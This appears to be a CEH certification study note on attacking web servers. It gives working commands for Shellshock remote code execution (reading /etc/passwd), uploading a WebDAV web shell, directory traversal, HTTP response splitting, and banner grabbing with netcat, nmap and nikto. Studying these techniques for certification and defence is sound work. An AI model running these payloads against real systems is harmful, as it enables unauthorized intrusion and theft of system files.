# 02. Attack Techniques — Hacking Web Servers

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 13). Covers Directory Traversal, Shellshock CGI RCE, WebDAV Webshell Upload, HTTP Response Splitting, and Banner Grabbing commands.

---

## ⚔️ 1. Primary Exploitation Workflows

### 1.1 Shellshock (CVE-2014-6271) Exploitation Workflow
When a web server runs CGI scripts written in Bash or invoking Bash subshells, environment variables passed from HTTP headers are evaluated.

```bash
# Shellshock RCE via Curl User-Agent Header Injection
curl -H "User-Agent: () { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://target.com/cgi-bin/test.cgi
```

### 1.2 WebDAV Webshell Upload & Execution Workflow
If WebDAV is enabled on an IIS or Apache server with insecure HTTP methods:

```bash
# 1. Test WebDAV HTTP methods using Davtest
davtest -url http://192.168.1.50/webdav/

# 2. Upload ASPX Webshell using Cadaver CLI
cadaver http://192.168.1.50/webdav/
dav:/webdav/> put shell.aspx
```

> [!DANGER] 🛡️ **📋 Comprehensive Web Server Attack Execution Matrix**

| Attack Vector | Vulnerable Service | Command / Execution Syntax | Technical Outcome |
| :--- | :--- | :--- | :--- |
| **Shellshock RCE** | CGI Script / Bash | `curl -H "User-Agent: () { :;}; /usr/bin/id" ...` | Unauthenticated RCE as `www-data` |
| **WebDAV Upload** | IIS / Apache WebDAV | `cadaver http://target/dav/` -> `put shell.php` | Web shell uploaded to web root |
| **Directory Traversal**| Web App Input | `curl http://target/view.php?file=../../../../etc/passwd` | Discloses sensitive system file |
| **HTTP Response Split**| Header Injection | `GET /index.php?lang=en%0d%0aSet-Cookie:SID=123` | Injects arbitrary headers/cookies |

---

## 🛡️ 2. Banner Grabbing & Footprinting CLI Syntax

```bash
# 1. HTTP Banner Grabbing via Netcat
nc -vv 192.168.1.50 80
HEAD / HTTP/1.1
Host: 192.168.1.50

# 2. Web Server Enumeration using Nmap HTTP Scripts
nmap -p 80,443 --script=http-enum,http-headers,http-methods 192.168.1.50

# 3. Web Vulnerability Scanning using Nikto
nikto -h http://192.168.1.50 -Tuning 1,2,3,b
```
